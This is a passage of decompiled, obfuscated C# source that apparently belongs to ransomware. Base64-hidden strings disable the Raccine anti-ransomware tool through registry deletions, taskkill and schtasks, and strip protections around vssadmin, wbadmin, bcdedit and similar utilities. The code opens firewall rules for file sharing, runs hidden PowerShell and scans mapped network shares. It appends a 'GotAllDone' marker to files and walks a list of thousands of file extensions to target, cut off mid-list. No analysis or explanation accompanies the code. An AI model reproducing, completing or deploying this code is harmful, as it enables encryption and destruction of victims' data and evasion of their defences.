				if (ykYiTFCYjtGh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (hzzRDIjGDyq)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
							.Replace("\"", "")
							.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
					}
				}
				catch
				{
				}
				ykYiTFCYjtGh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (hzzRDIjGDyq)
			{
				Console.WriteLine("Scanning for manually mapped resources completed...");
			}
		}
		catch
		{
		}
	}

	public static bool WjrMMpCSUiWI()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void CHjkcYzdJSQ(string wnqRurAVBow)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = agZtqMkMayfivgE("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + wnqRurAVBow;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool fCSCcBCUuOhJFjJ(string FAbAtXlvKm, string zbFRXTpLIdMhUH)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(FAbAtXlvKm, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(zbFRXTpLIdMhUH);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(FAbAtXlvKm, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool mjMhdDqwYRJ(string fIkkRqDFHBmgz)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			string MYQOTfnKqBSk = Path.GetPathRoot(fIkkRqDFHBmgz);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo d) => d.RootDirectory.Name == MYQOTfnKqBSk);
			return driveInfo != null && driveInfo.DriveFormat == "NTFS";
		}
		catch
		{
			return false;
		}
	}

	public static string wswgOTszZHwBwHF(SecureString vCqWtsZYnlqN)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(vCqWtsZYnlqN);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void lAQhAZUHqKD()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string gkNsMTzrXnlPn = pQwJuYtkrVyfmA("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gkNsMTzrXnlPn), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(agZtqMkMayfivgE("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(agZtqMkMayfivgE("d21pYy5leGU="));
					registryKey.DeleteSubKey(agZtqMkMayfivgE("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(agZtqMkMayfivgE("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(agZtqMkMayfivgE("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(agZtqMkMayfivgE("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(agZtqMkMayfivgE("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				gkNsMTzrXnlPn = pQwJuYtkrVyfmA("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gkNsMTzrXnlPn), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(agZtqMkMayfivgE("UmFjY2luZQ=="));
					registryKey.Close();
				}
				gkNsMTzrXnlPn = pQwJuYtkrVyfmA("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gkNsMTzrXnlPn), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(agZtqMkMayfivgE("UmFjY2luZQ=="));
					registryKey.Close();
				}
				gkNsMTzrXnlPn = pQwJuYtkrVyfmA("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(agZtqMkMayfivgE(gkNsMTzrXnlPn), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(agZtqMkMayfivgE("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			bhxKBVXCniiAP(agZtqMkMayfivgE("dGFza2tpbGw="), agZtqMkMayfivgE("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			bhxKBVXCniiAP(agZtqMkMayfivgE("cmVn"), agZtqMkMayfivgE(pQwJuYtkrVyfmA("=Y0LgISehJHVgUmbpN2YhJlIgY1LgIib1JFXu9WazJXZWRnblJnc1NEXzd3bk5WaXxFdm92cvJ3Yp1EXFJVQXRlRPNFXVN0SIJCIlRXZsVGZ")));
			bhxKBVXCniiAP(agZtqMkMayfivgE("cmVn"), agZtqMkMayfivgE("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			bhxKBVXCniiAP(agZtqMkMayfivgE("c2NodGFza3M="), agZtqMkMayfivgE("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void cjxIyyVHKHrvDrL(string nLrrlgbSQo, byte[] VQPJXqTxElqyBk)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(agZtqMkMayfivgE("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(nLrrlgbSQo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(VQPJXqTxElqyBk, 0, VQPJXqTxElqyBk.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void EAklTDrcJZHndQSS()
	{
		string gkNsMTzrXnlPn = pQwJuYtkrVyfmA("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gkNsMTzrXnlPn), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(agZtqMkMayfivgE("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void oZLuSlWBWyPTCv()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			bhxKBVXCniiAP(agZtqMkMayfivgE("bmV0c2g="), agZtqMkMayfivgE("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			bhxKBVXCniiAP(agZtqMkMayfivgE("bmV0c2g="), agZtqMkMayfivgE("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void IOviBUgqoNt(string YuFcJmyweppPGpi)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				IqHvwZeNnat(YuFcJmyweppPGpi, new string[4823]
				{
					"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
					"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
					"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
					"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
					"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
					"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
					"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
					"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
					"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
					"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
					"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
					"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
					"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
					"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
					"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
					"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
					"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
					"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
					"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
					"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
					"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
					"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
					"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
					"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
					"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
					"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
					"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
					"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
					"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
					"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
					"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
					"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
					"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
					"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
					"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
					"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
					"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
					"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
					"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
					"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
					"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
					"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
					"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
					"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
					"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
					"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
					"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
					"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
					"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
					"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
					"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
					"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
					"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
					"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
					"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
					"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
					"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
					"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
					"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
					"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
					"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
					"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
					"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
					"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
					"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
					"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
					"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
					"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
					"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
					"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
					"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
					"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
					"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
					"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
					"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
					"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
					"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
					"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
					"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
					"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
					"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
					"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
					"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
					"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
					"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
					"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
					"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
					"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
					"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
					"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
					"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
					"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
					"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
					"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
					"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
					"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
					"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
					"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
					"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
					"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
					"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
					"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
					"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
					"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
					"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
					"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
					"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
					"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
					"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
					"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
					"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
					"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
					"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
					"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
					"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
					"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
					"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
					"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
					"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
					"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
					"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
					"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
					"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
					"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
					"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
					"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
					"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
					"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
					"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
					"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
					"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
					"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
					"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
					"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
					"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
					"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
					"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
					"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
					"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
					"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
					"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
					"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
					"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
					"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
					"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
					"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
					"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
					"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
					"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
					"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
					"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
					"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
					"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
					"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
					"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
					"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
					"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
					"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
					"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
					"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
					"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
					"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
					"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
					"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
					"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
					"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
					"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
					"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
					"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
					"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
					"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
					"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
					"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
					"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
					"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
					"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
					"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
					"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
					"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
					"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
					"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
					"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
					"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
					"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
					"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
					"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
					"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
					"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
					"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
					"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
					"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
					"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
					"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
					"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
					"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
					"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
					"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
					"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
					"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
					"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
					"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
					"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
					"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
					"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
					"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
					"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
					"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
					"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
					"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
					"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
					"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
					"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
